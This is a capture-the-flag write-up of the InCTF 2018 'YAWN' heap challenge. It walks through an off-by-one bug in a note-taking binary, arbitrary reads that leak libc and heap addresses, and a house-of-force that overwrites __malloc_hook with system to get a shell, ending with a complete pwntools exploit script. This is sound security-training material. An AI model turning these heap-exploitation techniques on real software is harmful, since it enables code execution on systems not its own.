# YAWN ~ Write-Up

YAWN is a heap exploitation challenge and was part of the InCTF 2018 event.

**Points:** 956  
**Difficulty:** ??

## Environment Information

YAWN comes with two files ```libc-2.23.so``` and the challenge binary itself ```program```.

The vulnerable binary has been compiled with following protections: ```NX```, ```SSP``` and ```Full RELRO```. 
Furthermore, ```ASLR``` is enabled but the binary was not compiled with ```PIE```. The program depends on libc version ```2.23```

## Reverse Engineering Summary

When executing the binary, a menu opens up

```console
1) Add note
2) Edit note
3) Remove note
4) View note
5) Exit
```

Here is a brief description of these options:

**1:** alloc a new note with a generated ID by specifying a note-name and note-description  
**2:** edit existing note by specifying note-ID, new note-name, new note-description and size of new note-description  
**3:** free an existing note by specifying note-ID of target  
**4:** prints name, description and description-size of target note

After inspecting and analyzing the application's disassembly, this is how the program works (in a nutshell):

- a note is represented by ```struct note```

```c
// reversed C Code

struct note {

    char   name[0x50];
    size_t size;
    char*  desc;
};

// memory-layout of struct note
                                                                  
0x0000000000603410 desc      -> 0000000000000000 0000000000000021
0x0000000000603420              0000000000000000 0000000000000000 <------+        
0x0000000000603430 note      -> 0000000000000000 0000000000000071        |
0x0000000000603440 note.name -> 0000000000000000 0000000000000000        |
0x0000000000603450              0000000000000000 0000000000000000        |
0x0000000000603460              0000000000000000 0000000000000000        |
0x0000000000603470              0000000000000000 0000000000000000        |
0x0000000000603480              0000000000000000 0000000000000000        |
0x0000000000603490 note.size -> 0000000000000002 0000000000603420 <- note.desc [+0x58]
0x00000000006034a0              0000000000000000
```

- a global buffer (table @ 0x602040) of size 10 * 8 bytes is holding heap pointers to instances of ```struct note```

```c
struct note* table[10];
```

- when creating a new note, the program reads name (@ ```rbp-0x160```) and description (@ ```rbp-0x110```) from user. The description will be copied to 
heap via ```strdup```. Then it allocates a ```0x70-sized chunk``` for the ```struct note``` instance. The name will be copied to the start of 
```struct note```'s userdata. Also there seems to be an off-by-one when storing the name in stackframe which might allow one to merge 
the name buffer with the description buffer.


```assembly
; read note-name (off-by-one)
lea rax, [name]
mov esi, 0x51
mov rdi, rax
call fgets

[...]

; read note-description
lea rax, [desc]
mov esi, 0x101
mov rdi, rax
call fgets

[...]

; create copy on heap
lea rax, [desc]
mov rdi, rax
call strdup

[...]

; allocate note struct
mov edi, 0x60
call malloc

[...]

; set desc pointer in note
mov rdx, qword [desc]
mov qword [rax + 0x58], rdx

[...]

; copy name to start of userdata
mov rax, qword [name]
mov rsi, rax
mov rdi, rdx
call strcpy
```

- by editing a note, one can manipulate ```note.name``` plus the size and content of ```note.desc```. Also this subroutine leaks heap memory when
overwriting ```note.desc``` with the new heap pointer. Long story short, this subroutine allows user controlled allocations of arbitrary size and content.

- program prints content of ```note.desc``` pointer when viewing a note

## Exploit Strategy

We can leverage the previously mentioned off-by-one bug in order to merge two stack-buffers (```rbp-0x160``` and ```rbp-0x110```) into one large buffer.
This large buffer will be then copied to the start of the note structure via ```strcpy```.

We can use this to set the ```note.desc``` pointer to an address we want to leak, then call the view_note subroutine in order to 
print the ```note.desc``` pointer. That's our arbitrary read.

By choosing ```note.desc = GOT[setvbuf]``` and ```note.desc = &table[0]```, we can leak the libc base address and a heap pointer.

And by combining the same off-by-one bug with the edit_note subroutine (in order to make arbitrary allocations), we can perform a house-of-force
and overwrite the ```__malloc_hook``` with a custom handler (glibc's ```system``` function).

One final call to malloc with the address of ```/bin/sh``` (residing in libc-2.23.so) as parameter, will trigger the hook and drop a shell.

So, in summary

**Stage 1:** leak base address of glibc  
**Stage 2:** leak heap pointer in order to determine topchunk address  
**Stage 3:** corrupt topchunk metadata and registering fake ```__malloc_hook``` handler  
**Stage 4:** trigger the hook by a final call to ```malloc``` with ```/bin/sh``` address as size argument

## Putting it all together

```python
#!/usr/bin/python3

from pwn import *

# <================ globals ================>

context.terminal = ['gnome-terminal', '-e', 'sh', '-c'];

script = '''
continue
'''

id = 0;

# <================ main ================>

def main():

    elf  = context.binary = ELF("program");

    libc = ELF(elf.runpath + b"/libc.so.6");
    io   = initialize_io(elf);

    io.timeout = 0.1;
    io.recvuntil(b">> ");

    # stage 1 - leak libbase by reading GOT
    libc.address = leak_libbase(io, elf, libc);
    print("[+] leaked libbase: " + hex(libc.address));

    # stage 2 - leak topchunk by reading global array
    topchunk = leak_topchunk(io, elf);
    print("[+] leaked topchunk: " + hex(topchunk));

    # stage 3 - register __malloc_hook handler
    register_handler(io, libc, topchunk, libc.sym.system);
    print("[+] registered fake handler");

    # stage 4 - trigger hook and obtain a shell
    trigger_malloc_hook(io, libc.address + 0x18cd57);
    print("[+] obtaining shell...");

    io.interactive();

# <================ functions ================>

def leak_libbase(io, elf, libc):

    return arbitrary_read(io, elf.got['setvbuf']) - libc.sym.setvbuf;

def leak_topchunk(io, elf):

    return arbitrary_read(io, 0x602040 + (id * 0x8)) + 0x60;

def register_handler(io, libc, topchunk, handler):

    r        = libc.sym.__malloc_hook & 0xf;
    target   = libc.sym.__malloc_hook - r - 0x10;
    topchunk = topchunk + 0xa0 + 0x10;

    overwrite_topchunk(io);

    edit_note(io, 2, b"\x0a", b"\x0a", target - topchunk);
    edit_note(io, 2, b"\x0a", b"R" * r + p64(handler) + b"\x0a", 0x18);

def trigger_malloc_hook(io, rdi):

    edit_note(io, 2, b"\x0a", b"\x0a", rdi);

def arbitrary_read(io, addr):

    note_name = 0x4f * b"X";
    note_desc = 0x08 * b"S" + p64(addr);

    add_note(io, note_name, note_desc);
    x, leak = view_note(io, id - 1);

    return unpack(leak, 'all', endian = 'little');

def overwrite_topchunk(io):

    fake_meta = b"\xf1\xff\xff\xff\xff\xff\xff\xff";

    note_name = 0x4f * b"Y";
    note_desc = 0x08 * b"S" + 0x10 * b"\xff" + fake_meta;

    add_note(io, note_name, note_desc);

def add_note(io, name, desc):

    global id;

    io.send(b"1");

    io.sendafter(b"name: ", name + b"\n");
    io.sendafter(b"desc: ", desc + b"\n");
    io.recvuntil(b">> ");

    id += 1;

def view_note(io, id):

    io.send(b"4");
    io.sendafter(b"idx: ", f"{id}".encode());

    io.recvuntil(b"Name : ");
    name = io.recvline(keepends = False);

    io.recvuntil(b"Description : ");
    desc = io.recvline(keepends = False);

    io.recvuntil(b">> ");
    return name, desc;

def edit_note(io, id, name, desc, size):

    io.send(b"2");

    io.sendafter(b"index: ", f"{id}".encode());
    io.sendafter(b"name: ", name);

    io.sendafter(b"size: ", f"{size}".encode());
    io.sendafter(b"desc: ", desc);

    io.recvuntil(b">> ");

def initialize_io(elf):

    if args.GDB:
        return gdb.debug(elf.path, gdbscript = script);
    
    return process(elf.path);

# <================ init main ================>

if __name__ == "__main__":
    main();
```

![yawn](https://user-images.githubusercontent.com/46600932/155208172-dd735211-43d8-464d-873c-5fb49076b166.png)  
<sup>Finally executing the exploit</sup>

## Conclusion

This exploit leveraged an off-by-one bug to leak heap and libc memory, thus bypassing ```ASLR```. And, although a ```fastbin``` attack seems to be a valid
exploit strategy for this challenge, the very same bug was used to perform a much simpler house-of-force.

